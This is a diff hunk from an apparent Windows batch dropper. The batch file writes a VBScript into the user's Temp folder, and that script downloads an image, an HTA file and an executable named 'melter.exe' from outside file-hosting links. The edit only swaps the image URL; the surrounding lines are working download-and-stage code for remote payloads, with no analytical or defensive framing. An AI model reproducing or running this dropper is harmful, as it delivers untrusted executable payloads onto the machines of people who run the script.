@@ -41,7 +41,7 @@ cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
 @echo Set wshell = CreateObject("WScript.Shell")>>%lol%.vbs
 @echo voila = wshell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")>>%lol%.vbs
 @echo. >>%lol%.vbs
-(echo HTTPDownload "https://image.noelshack.com/fichiers/2022/44/2/1667267784-parti.png", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
+(echo HTTPDownload "https://image.noelshack.com/fichiers/2022/48/3/1669809091-risitas.jpeg", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 (echo HTTPDownload "https://ddl7.data.hu/get/314528/13482772/noel.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 (echo HTTPDownload "https://ddl8.data.hu/get/339969/12880996/melter.exe", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 @echo. >>%lol%.vbs
